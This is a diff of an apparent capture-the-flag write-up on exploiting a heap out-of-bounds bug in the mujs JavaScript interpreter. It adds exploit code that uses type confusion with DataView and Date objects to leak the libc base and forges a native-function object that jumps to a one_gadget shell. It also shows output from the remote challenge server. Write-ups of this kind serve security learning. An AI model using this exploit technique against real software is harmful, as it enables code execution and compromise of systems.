@@ -255,22 +255,63 @@ Now you might think overwriting `u.number` which is `double` and is 8 bytes woul
 
 ### Using heap OOB r/w for code execution
 
-So this part is mostly exploring heap and finding out what object lie on it. But I can also control it as well. So I allocated two DataView's after `c` which I can find offsets to. [We know](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/heap_overview/) that allocating more than 128kb using `malloc` causes it to be `mmap`'d and knowing the address of that chunk leaks libc's base.
+So this part is mostly exploring heap and finding out what object lie on it. But I can also control stuff on it as well. So I allocated two DataView's, _after_ `c` which I can find offsets to. [We know](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/heap_overview/) that allocating more than 128kb using `malloc` causes it to be `mmap`'d and knowing the address of that chunk leaks libc's base.
 
-So I used that for leaking libc base address and then forged a `JS_CCFUNCTION` type object which has a `u.c.function` which we can simply call:
+Let's try:
+```js
+b = DataView(0x68);
+a = DataView(0x48);
+b = DataView(0x48);
+c = DataView(0x48);
+e = DataView(0x48);
+f = DataView(0x1000 * 0x1000);
 
+print(c)
+b.setUint8(0x48+8, 10); // set c type to Date
+print(c)
+Date.prototype.setTime.bind(c)(1.09522e+12) // write random big number to u.number/u.length
+b.setUint8(0x48+8, 16); // set c type back to DataView
+print(c)
+print(c.getLength())
+
+
+sh32 = 4294967296 // 1<<32
+libb_addr_off = 472
+libc_leak = c.getUint32(libb_addr_off) + (c.getUint32(libb_addr_off+4)*sh32)
+
+libc_off = 0x7ffff7c31000 - 0x7ffff6bfe010 // got this from gdb
+libc_base = libc_leak + libc_off
+print('libc base:', libc_base.toString(16))
+```
+Using this prints:
+```
+[object DataView]
+[object Date]
+[object DataView]
+1587544064
+libc base: 7f786e7e8000
+```
+So, now we've leaked libc base.
+
+For controlling code execution I forged a `JS_CCFUNCTION` type of object which has a `u.c.function`:
+
+This type of js object can simple be called inside js and will result in underlying `u.c.function` being called. Since we have full control over heap we can modify a DataView object to become `CCFUNCTION`.
+
+Here's the line where it get's called:
 ```c
 void js_call(js_State *J, int n)
 {
 // ...
-			jsR_callfunction(J, n, obj->u.f.function, obj->u.f.scope);
+	} else if (obj->type == JS_CCFUNCTION) {
+		jsR_pushtrace(J, obj->u.c.name, "native", 0);
+		jsR_callcfunction(J, n, obj->u.c.length, obj->u.c.function);
+		--J->tracetop;
+	}
 // ...
 }
 ```
 
-It's basically a C function pointer we can call directly from js.
-
-So now we just use amazing [one_gadget](https://github.com/david942j/one_gadget):
+As for the target to jump to we use amazing [one_gadget](https://github.com/david942j/one_gadget). It gives us code execution using a single jump to a specific libc address.
 ```bash
 $ one_gadget libc.so.6
 0xe6c7e execve("/bin/sh", r15, r12)
@@ -294,8 +335,7 @@ And third gadget got worked!
 $ nc 124.71.182.21 9999
 ./tmp/18759.js
 Please give your exp.js here, end with '< EOF >':
-b = DataView(0x68);
-.... rest of exploit here
+.... exploit here
 < EOF >
 last_size: 0
 ./mujs ./tmp/18759.js
@@ -350,7 +390,7 @@ c.setUint32(e_obj_off+8+4, Math.floor(one_gag/sh32)&0xffffffff)
 e() // e is now a function so we can call it 
 ```
 
-I'm speaking with no experience here but this is basic idea of how heap overflow bugs are exploited in big projects like V8 but there's much more stuff going on there so it's way harder to get determinism.
+I'm speaking with no experience here but this is basic idea of how heap overflow bugs are exploited in big projects like [V8](https://v8.dev/) but there's much more stuff going on there so it's way harder to get determinism.
 
 Thanks for the reading till the end! 
 
